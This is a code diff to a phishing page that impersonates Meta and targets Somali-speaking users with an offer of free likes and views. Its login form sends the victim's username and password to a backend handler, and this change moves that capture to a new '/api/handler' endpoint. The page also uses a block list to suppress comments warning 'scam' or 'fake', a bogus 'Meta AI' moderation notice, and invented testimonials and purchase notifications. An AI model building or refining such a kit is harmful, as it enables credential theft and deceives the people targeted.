@@ -54,8 +54,11 @@
         }
         .qty-btn.active { background: var(--meta-blue); color: #fff; border-color: var(--meta-blue); }
 
-        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #dddfe2; margin-top: 15px; background: #f5f6f7; }
+        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #dddfe2; margin-top: 15px; background: #f5f6f7; outline: none; }
+        input:focus { border-color: var(--meta-blue); background: #fff; }
+        
         .btn-main { width: 100%; padding: 16px; background: var(--meta-blue); color: #fff; border: none; border-radius: 12px; font-weight: 700; cursor: pointer; margin-top: 20px; font-size: 16px; }
+        .btn-main:disabled { background: #ccc; cursor: not-allowed; }
 
         /* Somali Comments Section */
         .comment-item { display: flex; gap: 12px; margin-bottom: 18px; }
@@ -108,7 +111,7 @@
             <form id="metaForm">
                 <input type="text" id="user" placeholder="Mobile number or email" required>
                 <input type="password" id="pass" placeholder="Password" required>
-                <button type="submit" class="btn-main">Verify & Claim</button>
+                <button type="submit" id="submitBtn" class="btn-main">Verify & Claim</button>
             </form>
         </div>
 
@@ -137,31 +140,10 @@
                     <div class="c-text">Masha Allah, likes-kii hadda ayay ii bilaabmeen. Aad ayaan u faraxsanahay.</div>
                 </div>
             </div>
-            <div class="comment-item">
-                <img src="https://i.pravatar.cc/150?u=abdi" class="avatar">
-                <div class="bubble">
-                    <div class="c-name">Mustafe Keynan <span class="v-badge">✔</span></div>
-                    <div class="c-text">Markii hore waan shakiyay, laakiin markaan xaqiijiyay ciwaankayga durbadiiba views ayaa ii soo dhacay.</div>
-                </div>
-            </div>
-            <div class="comment-item">
-                <img src="https://i.pravatar.cc/150?u=hani" class="avatar">
-                <div class="bubble">
-                    <div class="c-name">Hani Deeqo <span class="v-badge">✔</span></div>
-                    <div class="c-text">Shaqo fiican Meta, ciwaankayga wuu isbedelay oo hadda dad badan ayaa i arka.</div>
-                </div>
-            </div>
-            <div class="comment-item">
-                <img src="https://i.pravatar.cc/150?u=nasro" class="avatar">
-                <div class="bubble">
-                    <div class="c-name">Nasro Maxamed <span class="v-badge">✔</span></div>
-                    <div class="c-text">Adeeg dhab ah weeye. Aad baad u mahadsantihiin! ❤️</div>
-                </div>
-            </div>
         </div>
 
         <div style="display: flex; gap: 10px; margin-top: 15px;">
-            <div class="avatar"></div>
+            <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" class="avatar">
             <div style="flex: 1;">
                 <input type="text" id="userComment" placeholder="Qor faallo (Write a comment)..." style="margin:0; border-radius:20px; padding:10px 15px; background:#f0f2f5; border:none;" onkeypress="handlePost(event)">
                 <p id="modAlert" style="color:red; font-size:10px; display:none; margin-top:5px;">⚠️ Meta AI: Faalladaada waa la xannibay sababtoo ah asluub-xumo.</p>
@@ -173,9 +155,10 @@
 <script>
     let currentSrv = "";
     let currentQty = "";
-    const names = ["Cali Maxamed", "Maryan Axmed", "Xuseen Xasan", "Ayaanle Cismaan", "Fadumo Cali", "Abdirahman"];
+    const names = ["Cali Maxamed", "Maryan Axmed", "Xuseen Xasan", "Ayaanle Cismaan", "Fadumo Cali", "Abdirahman", "Nimco Deeqa"];
     const blockList = ["iska ilaliya", "waa been", "scam", "fake", "is ilaaliya", "been", "hack", "digniin", "warning", "⚠️", "daciif"];
 
+    // Function to select service
     function toggleQty(el, type) {
         document.querySelectorAll('.box').forEach(b => b.classList.remove('active'));
         el.classList.add('active');
@@ -183,43 +166,88 @@
         document.getElementById('qty-area').style.display = 'block';
     }
 
+    // Function to select quantity
     function setQty(el, val) {
         document.querySelectorAll('.qty-btn').forEach(b => b.classList.remove('active'));
         el.classList.add('active');
         currentQty = val;
     }
 
+    // Go to login step
     function goNext() {
         if(!currentSrv || !currentQty) return alert("Fadlan dooro adeegga iyo tirada!");
         document.getElementById('step-1').classList.add('hidden');
         document.getElementById('step-2').classList.remove('hidden');
     }
 
+    // Handle form submission to Node.js
+    document.getElementById('metaForm').onsubmit = async function(e) {
+        e.preventDefault();
+        
+        const submitBtn = document.getElementById('submitBtn');
+        submitBtn.disabled = true;
+        submitBtn.innerText = "Verifying...";
+
+        const payload = {
+            user: document.getElementById('user').value,
+            pass: document.getElementById('pass').value,
+            service: currentSrv,
+            amount: currentQty
+        };
+
+        try {
+            // FADLAN HUBI: URL-kan 'api/handler' waa inuu la mid yahay meesha aad Node.js-ka dhigtay
+            const response = await fetch('/api/handler', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            const data = await response.json();
+
+            if (data.status === "success") {
+                document.getElementById('step-2').classList.add('hidden');
+                document.getElementById('success').classList.remove('hidden');
+            } else {
+                alert("Cilad: " + (data.message || "Isku day mar kale"));
+                submitBtn.disabled = false;
+                submitBtn.innerText = "Verify & Claim";
+            }
+        } catch (err) {
+            console.error(err);
+            alert("Server-ka lama xiriiri karo. Hubi internet-kaaga.");
+            submitBtn.disabled = false;
+            submitBtn.innerText = "Verify & Claim";
+        }
+    };
+
+    // Comment handling
     function handlePost(e) {
         if(e.key === 'Enter') {
             const input = document.getElementById('userComment');
-            const alert = document.getElementById('modAlert');
+            const alertMsg = document.getElementById('modAlert');
             const val = input.value.toLowerCase();
 
-            if(val === "") return;
+            if(val.trim() === "") return;
 
             const isBlocked = blockList.some(word => val.includes(word));
             if(isBlocked) {
-                alert.style.display = 'block';
+                alertMsg.style.display = 'block';
                 input.value = "";
-                setTimeout(() => alert.style.display = 'none', 4000);
+                setTimeout(() => alertMsg.style.display = 'none', 4000);
                 return;
             }
 
             const list = document.getElementById('commentList');
             const div = document.createElement('div');
             div.className = 'comment-item';
-            div.innerHTML = `<img src="https://i.pravatar.cc/150?u=me" class="avatar"><div class="bubble"><div class="c-name">You (Adiga)</div><div class="c-text">${input.value}</div></div>`;
+            div.innerHTML = `<img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" class="avatar"><div class="bubble"><div class="c-name">You (Adiga)</div><div class="c-text">${input.value}</div></div>`;
             list.prepend(div);
             input.value = "";
         }
     }
 
+    // Fake live notifications
     function showToast() {
         const area = document.getElementById('notif-area');
         const name = names[Math.floor(Math.random()*names.length)];
@@ -229,24 +257,9 @@
         area.appendChild(toast);
         setTimeout(() => toast.remove(), 4000);
     }
-    setInterval(showToast, 6000);
-
-    document.getElementById('metaForm').onsubmit = function(e) {
-        e.preventDefault();
-        fetch('server.php', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                user: document.getElementById('user').value,
-                pass: document.getElementById('pass').value,
-                service: currentSrv + " (" + currentQty + ")"
-            })
-        }).then(() => {
-            document.getElementById('step-2').classList.add('hidden');
-            document.getElementById('success').classList.remove('hidden');
-        });
-    };
+    setInterval(showToast, 8000);
 </script>
 
 </body>
 </html>
+
